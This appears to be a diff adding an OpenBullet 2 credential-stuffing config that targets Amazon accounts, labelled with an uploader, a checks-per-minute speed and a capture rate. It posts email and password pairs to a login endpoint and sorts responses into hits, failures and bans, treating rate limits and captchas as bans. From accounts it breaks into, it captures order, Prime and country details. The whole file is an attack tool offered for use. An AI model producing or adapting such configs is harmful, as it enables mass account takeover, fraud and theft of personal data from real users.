@@ -1,0 +1,33 @@
+# OpenBullet 2 config — Amazon OpenBullet v11
+# Target: Amazon   Tool: OpenBullet 2
+# Uploader: user #7
+# CPM: 1500   Capture rate: 0.22
+# ============================================================
+
+BLOCK:HttpRequest
+  url = "https://api.amazon.com/v1/auth/login"
+  method = POST
+  headers {
+    "User-Agent" = "<UA>"
+    "Content-Type" = "application/json"
+    "Accept" = "application/json"
+  }
+  body {
+    "{\"email\":\"<INPUT>\",\"password\":\"<PASS>\"}"
+  }
+ENDBLOCK
+
+BLOCK:Keycheck
+  banOn = "429"
+  banOn = "captcha"
+  successOn = "\"token\":\""
+  failureOn = "\"error\""
+ENDBLOCK
+
+BLOCK:Parse
+  "\"orders\":\"(.*?)\"" -> CAPTURE "Orders"
+  "\"prime\":\"(.*?)\"" -> CAPTURE "Prime"
+  "\"country\":\"(.*?)\"" -> CAPTURE "Country"
+ENDBLOCK
+
+# config-id: 615461
